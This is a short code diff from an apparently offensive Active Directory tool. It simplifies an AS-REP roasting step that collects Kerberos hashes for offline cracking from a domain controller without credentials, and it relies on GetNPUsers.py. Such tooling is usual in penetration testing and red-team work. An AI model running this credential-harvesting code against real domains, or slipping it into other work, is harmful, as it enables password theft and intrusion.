@@ -306,8 +306,6 @@ def asrep_roast(dc_ip: str, domain: str, users: list[str]) -> list[str]:
 
     _log(f"  AS-REP roasting {len(users)} users against {dc_ip} (domain={domain})")
 
-    domain_upper = domain.upper()
-
     # The getKerberosTGT API returns a TGT but does not expose the raw
     # AS-REP PDU needed to format a hashcat hash.  Delegate directly to
     # the subprocess fallback (GetNPUsers.py) which handles this correctly.
@@ -852,14 +850,8 @@ def run() -> dict:
         # --- B: AS-REP Roasting (no credentials needed, port 88 required) ---
         if _port_open(dc, 88):
             if all_users:
-                # Try Python API first
-                api_hashes = asrep_roast(dc_ip, domain, all_users)
-                if api_hashes:
-                    all_asrep_hashes.extend(h for h in api_hashes if h not in all_asrep_hashes)
-                else:
-                    # Fall back to subprocess (GetNPUsers.py on Kali)
-                    sub_hashes = asrep_roast_subprocess(dc_ip, domain, all_users)
-                    all_asrep_hashes.extend(h for h in sub_hashes if h not in all_asrep_hashes)
+                asrep_hashes = asrep_roast(dc_ip, domain, all_users)
+                all_asrep_hashes.extend(h for h in asrep_hashes if h not in all_asrep_hashes)
             else:
                 _log("  No users enumerated — skipping AS-REP roast")
         else:
